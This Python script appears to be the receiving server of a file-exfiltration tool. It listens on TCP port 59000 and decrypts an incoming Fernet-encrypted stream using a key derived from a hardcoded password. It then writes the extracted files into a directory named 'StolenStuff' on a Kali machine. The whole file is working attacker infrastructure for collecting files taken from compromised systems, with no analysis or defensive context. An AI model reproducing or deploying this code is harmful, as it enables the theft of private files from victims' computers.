import os
import sys
import socket
#from Crypto.Cipher import AES
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

password_provided = "Covid19" # This is input in the form of a string
password = password_provided.encode() # Convert to type bytes
salt = b'Bwahahaha'
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password))

if __name__ == "__main__":
    try:
        # create a socket
        socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_connection.bind(('', 59000))

        # listen for a client
        socket_connection.listen(5)
        client_request, r = socket_connection.accept()

        os.chdir('/home/kali/Documents/StolenStuff/')# put path of the directory you want the files to go

        # naming title
        count = 1
        done = False
        data = b''
        while b'\x00\x01\x02END\x00\x01\x02' not in data:
            data += client_request.recv(1024)

        # Cut out the end bytes
        data = data[:len(data)-9]
        
        # Unencrypt "data" here
        f = Fernet(key)
        unencrypted_data = f.decrypt(data)
        
        # Split the data by file
        datalist = unencrypted_data.split(b'\x00\x01\x02BEGIN\x00\x01\x02')
        datalist.pop(0)

        for filedata in datalist:
            # Split apart file name and file contents
            fileFormat = filedata.split(b'\x00\x01\x02FILENAME\x00\x01\x02')
            f = open(fileFormat[0], "wb")
            f.write(fileFormat[1])
            f.close()

    except KeyboardInterrupt:
        sys.exit()
